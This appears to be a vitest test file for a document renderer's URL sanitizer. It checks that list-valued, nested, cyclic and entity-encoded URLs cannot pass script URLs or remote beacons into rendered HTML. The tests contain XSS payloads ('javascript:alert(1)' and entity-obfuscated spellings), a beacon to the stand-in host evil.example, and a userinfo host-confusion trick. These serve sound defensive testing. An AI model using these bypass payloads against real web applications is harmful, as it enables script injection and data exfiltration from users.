/**
 * A URL that is not text.
 *
 * Every URL check in the renderer began `typeof value === 'string'`, and
 * what was not a string went through unjudged. React writes a list into an
 * attribute as its entries joined, so
 *
 *     <a href={["javascript:alert(1)"]}>
 *
 * reached the page as `href="javascript:alert(1)"`: the hole
 * url-sanitizer.test.tsx describes, bundle code on the host origin for the
 * price of a click, reopened by two brackets. The same for `action` and
 * `formaction`. A list-valued `src`, `poster`, `srcset` or `ping`, and a
 * list in an inline style, fetched from any host while consent was pending
 * and with no `net` grant after it, which is the hole markup-egress.test.tsx
 * describes. And a URL nested more than four levels down in a component's
 * items was past the depth the scrub walked to, and was not looked at.
 *
 * Under a name that means a URL, text is judged, a number is its digits, and
 * anything else is not passed on at all.
 */

import React from 'react';
import { describe, it, expect, vi } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { parse } from '../src/parser';
import { renderDocument, ComponentRegistry } from '../src/renderer';
import { isSafeUrl, isRemoteUrl, hasRemoteSrcSetCandidate } from '../src/renderer/sanitize-html';
import type { SoftNProps, SoftNRenderContext } from '../src/types';
import type { EgressConfig } from '../src/runtime/egress-policy';

const SCRIPT = 'javascript:alert(1)';
const BEACON = 'https://evil.example/b?d=1';

interface Node {
  label?: string;
  href?: unknown;
  children?: Node[];
}

/** A component that hands what it is given to the DOM, as <Breadcrumb> and <Image> do. */
function Pic(props: SoftNProps): React.ReactElement {
  return React.createElement('img', {
    src: props.src as string,
    srcSet: props.srcSet as string,
    style: props.style as React.CSSProperties,
  });
}
function Trail(props: SoftNProps): React.ReactElement {
  const items = (props.items as Node[] | undefined) ?? [];
  return React.createElement(
    'nav',
    null,
    items.map((item, i) => React.createElement('a', { key: i, href: item?.href as string }, item?.label))
  );
}
/** Follows the first child all the way down and links to what is there. */
function Deepest(props: SoftNProps): React.ReactElement {
  let node = (props.items as Node[] | undefined)?.[0];
  let levels = 1;
  while (node?.children?.[0]) {
    node = node.children[0];
    levels++;
  }
  return React.createElement('a', { href: node?.href as string, 'data-levels': levels }, node?.label);
}

/** Links to each of the first six along the first-child line, however the tree is shaped. */
function Chain(props: SoftNProps): React.ReactElement {
  const links: React.ReactElement[] = [];
  let node = (props.items as Node[] | undefined)?.[0];
  for (let i = 0; i < 6 && node; i++) {
    links.push(React.createElement('a', { key: i, href: node.href as string }, node.label));
    node = node.children?.[0];
  }
  return React.createElement('nav', null, links);
}

function html(source: string, state: Record<string, unknown> = {}, egress?: EgressConfig | null): string {
  const registry = new ComponentRegistry();
  registry.register('Pic', Pic);
  registry.register('Trail', Trail);
  registry.register('Deepest', Deepest);
  registry.register('Chain', Chain);
  const doc = parse(source);
  const context = {
    state,
    setState: () => {},
    data: {},
    functions: {},
    computed: {},
    ...(egress === undefined ? {} : { consentPending: egress?.consentPending === true, egress }),
  } as unknown as SoftNRenderContext;
  const quiet = vi.spyOn(console, 'warn').mockImplementation(() => {});
  try {
    return renderToStaticMarkup(React.createElement(React.Fragment, null, renderDocument(doc, context, registry)));
  } finally {
    quiet.mockRestore();
  }
}

const pending: EgressConfig = { consentPending: true, permissions: {} };
const declaredNothing: EgressConfig = { permissions: {} };
const netScoped: EgressConfig = { permissions: { net: { enabled: true, allowed_hosts: ['cdn.example'] } } };

/** Every URL attribute a raw element may carry, on an element that takes it. */
const RAW: Array<[string, string, boolean]> = [
  ['a', 'href', false],
  ['area', 'href', true],
  ['img', 'src', true],
  ['img', 'srcSet', true],
  ['source', 'src', true],
  ['input', 'src', true],
  ['audio', 'src', false],
  ['video', 'poster', false],
  ['form', 'action', false],
  ['button', 'formAction', false],
  ['blockquote', 'cite', false],
  ['a', 'ping', false],
  ['table', 'background', false],
];
const element = (tag: string, attr: string, isVoid: boolean) => (isVoid ? `<${tag} ${attr}={u} />` : `<${tag} ${attr}={u}>x</${tag}>`);

describe('a URL attribute given a list', () => {
  it.each(RAW)('<%s %s> does not write a script URL from a list', (tag, attr, isVoid) => {
    // The text form is the control: it was always dropped.
    expect(html(element(tag, attr, isVoid), { u: SCRIPT })).not.toContain('javascript:');
    for (const u of [[SCRIPT], [[SCRIPT]], ['', SCRIPT], [SCRIPT, '/ok']]) {
      expect(html(element(tag, attr, isVoid), { u }), JSON.stringify(u)).not.toContain('javascript:');
    }
  });

  it.each(RAW)('<%s %s> does not fetch from a list while consent is pending, or with no net grant', (tag, attr, isVoid) => {
    for (const policy of [pending, declaredNothing]) {
      // `href` is navigation the user chooses once consent is answered; while it is pending it is withheld like the rest.
      if (attr === 'href' && policy === declaredNothing) continue;
      expect(html(element(tag, attr, isVoid), { u: BEACON }, policy), 'text').not.toContain('evil.example');
      expect(html(element(tag, attr, isVoid), { u: [BEACON] }, policy), 'list').not.toContain('evil.example');
    }
  });

  it('an array literal in the markup is the same list', () => {
    expect(html(`<a href={["${SCRIPT}"]}>x</a>`)).toBe('<a>x</a>');
  });

  it('an object is not a URL either', () => {
    expect(html('<a href={u}>x</a>', { u: { a: SCRIPT } })).toBe('<a>x</a>');
  });
});

describe('what a URL attribute may still be', () => {
  it('text, as before', () => {
    expect(html('<a href={u}>x</a>', { u: '/docs' })).toBe('<a href="/docs">x</a>');
    expect(html('<img src={u} />', { u: 'https://cdn.example/x.png' }, netScoped)).toContain('src="https://cdn.example/x.png"');
  });

  it('a number, which is its digits', () => {
    expect(html('<a href={u}>x</a>', { u: 7 })).toBe('<a href="7">x</a>');
    expect(html('<Pic src={u} />', { u: 7 })).toContain('src="7"');
  });

  it('nothing: null, undefined and false leave the attribute off without a word', () => {
    const warned = vi.spyOn(console, 'warn').mockImplementation(() => {});
    try {
      for (const u of [null, undefined, false]) {
        const doc = parse('<a href={u}>x</a>');
        const context = { state: { u }, setState: () => {}, data: {}, functions: {}, computed: {} } as unknown as SoftNRenderContext;
        expect(renderToStaticMarkup(React.createElement(React.Fragment, null, renderDocument(doc, context, new ComponentRegistry())))).toBe('<a>x</a>');
      }
      expect(warned).not.toHaveBeenCalled();
    } finally {
      warned.mockRestore();
    }
  });
});

describe('a registered component given a URL that is not text', () => {
  it('does not get a list under a URL name', () => {
    expect(html('<Pic src={u} />', { u: [SCRIPT] })).not.toContain('javascript:');
    expect(html('<Pic src={u} />', { u: [BEACON] }, pending)).not.toContain('evil.example');
    expect(html('<Pic srcSet={u} />', { u: [BEACON] }, declaredNothing)).not.toContain('evil.example');
  });

  it('nor one inside its items', () => {
    const out = html('<Trail items={crumbs} />', { crumbs: [{ label: 'Home', href: [SCRIPT] }, { label: 'Docs', href: '/docs' }] });
    expect(out).not.toContain('javascript:');
    expect(out).toContain('href="/docs"');
    expect(out).toContain('Home');
  });

  it('a list whose entries are each allowed is still not a URL: joined, it names another host', () => {
    // "https://cdn.example,@other.example/x" is user "cdn.example," at host
    // other.example. Judging the entries one by one would pass both.
    const out = html('<Pic src={u} />', { u: ['https://cdn.example', '@other.example/x.png'] }, netScoped);
    expect(out).not.toContain('other.example');
  });

  it('leaves the state it read from as it was', () => {
    const crumbs = [{ label: 'Home', href: [SCRIPT] }];
    html('<Trail items={crumbs} />', { crumbs });
    expect(crumbs[0].href).toEqual([SCRIPT]);
  });
});

describe('a URL deep inside a component’s items', () => {
  const nested = (levels: number, href: unknown): Node[] => {
    let node: Node = { label: 'leaf', href };
    for (let i = 1; i < levels; i++) node = { label: `level ${levels - i}`, children: [node] };
    return [node];
  };

  it.each([2, 4, 5, 6, 9, 20])('is judged %i levels down', (levels) => {
    const out = html('<Deepest items={tree} />', { tree: nested(levels, SCRIPT) });
    expect(out).not.toContain('javascript:');
    // The tree above it is still there to be walked.
    expect(out).toContain(`data-levels="${levels}"`);
  });

  it('and kept when it is safe', () => {
    expect(html('<Deepest items={tree} />', { tree: nested(20, '/deep') })).toContain('href="/deep"');
  });

  it('is not handed over unjudged past the depth the scrub gives up at', () => {
    // Four hundred levels is past it: what is down there is dropped, where
    // the old limit returned it as it was.
    const out = html('<Deepest items={tree} />', { tree: nested(400, SCRIPT) });
    expect(out).not.toContain('javascript:');
    expect(out).toContain('level ');
  });

  it('a tree that holds itself ends where it comes back round, and is judged up to there', () => {
    const loop: Node = { label: 'loop', href: SCRIPT };
    loop.children = [{ label: 'child', href: SCRIPT, children: [loop] }];
    const out = html('<Chain items={items} />', { items: [loop] });
    expect(out).not.toContain('javascript:');
    // The two it has are drawn, and the way back to the first is not there to follow.
    expect(out).toBe('<nav><a>loop</a><a>child</a></nav>');
  });

  it('a tree whose branches are shared is walked once a branch, not once a path', () => {
    // Twenty-four levels, each holding the one below twice: sixteen million
    // paths to the leaf and twenty-five records. Walked by path that is ten
    // seconds of a frozen page, and every level more doubles it; the limit
    // this replaced kept it short by not looking.
    let node: Node = { label: 'leaf', href: SCRIPT };
    for (let i = 0; i < 24; i++) node = { label: `level ${i}`, children: [node, node] };
    const started = Date.now();
    const out = html('<Deepest items={tree} />', { tree: [node] });
    expect(Date.now() - started).toBeLessThan(2000);
    expect(out).not.toContain('javascript:');
    expect(out).toContain('data-levels="25"');
  });

  it('a record that appears twice is not a tree that holds itself', () => {
    const shared = { label: 'Twice', href: '/twice' };
    const out = html('<Trail items={items} />', { items: [shared, shared] });
    expect(out.match(/href="\/twice"/g)?.length).toBe(2);
  });
});

describe('an inline style given a list', () => {
  const paint = ['url(https://evil.example/b)'];

  it('does not fetch from it on a raw element', () => {
    for (const policy of [pending, declaredNothing]) {
      expect(html('<div style={s}>x</div>', { s: { backgroundImage: paint[0] } }, policy), 'text').not.toContain('evil.example');
      expect(html('<div style={s}>x</div>', { s: { backgroundImage: paint } }, policy), 'list').not.toContain('evil.example');
      expect(html('<div style={s}>x</div>', { s: { backgroundImage: { toString: 'x' }, color: 'red' } }, policy)).toContain('color:red');
    }
  });

  it('nor through a component that passes its style on', () => {
    expect(html('<Pic style={s} />', { s: { backgroundImage: paint } }, pending)).not.toContain('evil.example');
  });

  it('keeps numbers and text that name nothing to fetch', () => {
    const out = html('<div style={s}>x</div>', { s: { opacity: 0.5, color: 'red', backgroundImage: paint } }, pending);
    expect(out).toContain('opacity:0.5');
    expect(out).toContain('color:red');
  });
});

describe('the URL questions asked of something that is not text', () => {
  it('isSafeUrl answers no, where it used to throw', () => {
    for (const value of [7, true, false, null, undefined, [SCRIPT], ['/ok'], { href: '/ok' }]) {
      expect(isSafeUrl(value as unknown as string), JSON.stringify(value)).toBe(false);
    }
    expect(isSafeUrl('/ok')).toBe(true);
  });

  it('isRemoteUrl and hasRemoteSrcSetCandidate answer yes, so it is withheld', () => {
    for (const value of [7, true, null, undefined, [BEACON], {}]) {
      expect(isRemoteUrl(value as unknown as string), JSON.stringify(value)).toBe(true);
      expect(hasRemoteSrcSetCandidate(value as unknown as string), JSON.stringify(value)).toBe(true);
    }
    expect(isRemoteUrl('/ok')).toBe(false);
  });
});

describe('a URL spelled with entities in a quoted attribute', () => {
  // A quoted attribute's entities are read by the parser, so the value the
  // renderer judges is the value the browser would act on. Were the check
  // made on the spelling, `java&#115;cript:` would pass it and be decoded
  // afterwards.
  it.each([
    ['<a href="java&#115;cript:alert(1)">x</a>'],
    ['<a href="&#106;avascript:alert(1)">x</a>'],
    ['<a href="javascript&#58;alert(1)">x</a>'],
    ['<a href="javascript&#x3A;alert(1)">x</a>'],
    ['<form action="&#x6A;avascript:alert(1)">x</form>'],
  ])('%s is not written', (source) => {
    const out = html(source);
    expect(out).not.toMatch(/javascript/i);
    expect(out).not.toContain('alert');
  });

  it('a remote picture spelled with entities is withheld while consent is pending', () => {
    const out = html('<img src="https&#58;//evil.example/b?d=1" /><Box style="background: url(&quot;https://evil.example/b&quot;)" />', {}, pending);
    expect(out).not.toContain('evil.example');
  });

  it('an ordinary address with &amp; in it is the address', () => {
    expect(html('<a href="/search?q=tea&amp;page=2">x</a>')).toBe('<a href="/search?q=tea&amp;page=2">x</a>');
  });
});
